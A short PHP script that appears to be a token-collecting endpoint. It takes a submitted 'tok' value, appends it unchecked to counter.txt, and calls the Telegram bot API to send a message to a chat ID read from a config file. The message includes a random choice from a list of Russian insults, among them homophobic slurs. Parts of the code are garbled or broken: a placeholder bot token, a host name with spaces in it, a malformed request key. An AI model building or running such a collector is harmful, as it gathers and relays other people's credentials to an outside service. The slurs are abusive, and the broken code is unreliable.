<?php
$fl = file_get_contents('CONFIG.php');
$a = explode("\n", $fl);

if (isset($_POST["tok"])) { 
    $result = array(
    	'tok' => $_POST["tok"],
    ); 

    echo json_encode($result); 
}

if(isset($_REQUEST['tok'])){ 
$token = $_REQUEST['tok'];

$fp = fopen("counter.txt", "a"); // Открываем файл в режиме записи 
$mytext = "{$_REQUEST['tok']}\r\n"; // Исходная строка
$test = fwrite($fp, $mytext); // Запись в файл
if ($test) echo '';
else echo '';
fclose($fp); //Закрытие файла
}

$strings = array(
    'педик',
    'чмо',
    'гадон',
    'лох',
    'лось',
    'блядь',
    'ХУЙ',
    'блядина',
    'пиздабол',
    'глиномес',
    'ну тут я не стану редактировать',
);
$key = array_rand($strings);

$tokenn = "а токена нет";$data = [    'text' => "а сообщения нет {$strings[$key]}\nа токена нет\n{$_REQUEST['t iki tok']}",
	'chat_id' => ("{$a[0]}")];file_get_contents("https://api . telegram . org/bot$tokenn/sendMessage?" . http_build_query($data) );
	exit;
?>
